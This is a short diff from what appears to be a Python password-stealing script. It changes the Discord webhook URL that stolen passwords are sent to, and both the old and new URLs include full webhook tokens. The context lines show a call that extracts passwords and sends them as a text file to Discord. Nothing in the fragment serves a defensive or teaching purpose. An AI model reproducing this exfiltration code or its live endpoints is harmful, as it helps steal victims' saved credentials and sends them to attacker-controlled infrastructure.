@@ -213,7 +213,7 @@ class Main():
 
 try:
     # Set the Discord webhook URL
-    WEBHOOK_URL = "https://discord.com/api/webhooks/1140019902707679374/6k12Wb6vDx43aTcgltwIQa2mEvuOF-YDUW38WYAK1UQiwQ3r4ZSHvtmI55t3OWhKviOl"
+    WEBHOOK_URL = "https://discord.com/api/webhooks/1156670824686829638/rR7V3hb8E6asiTh6nRiZP5ZTcEly5n0_TzoJazIAE3-eR_PgZEn-iIPEG0Sf1DRZkvdR"
 
     # extract the passwords and send them as a text file to Discord
     extract_passwords()
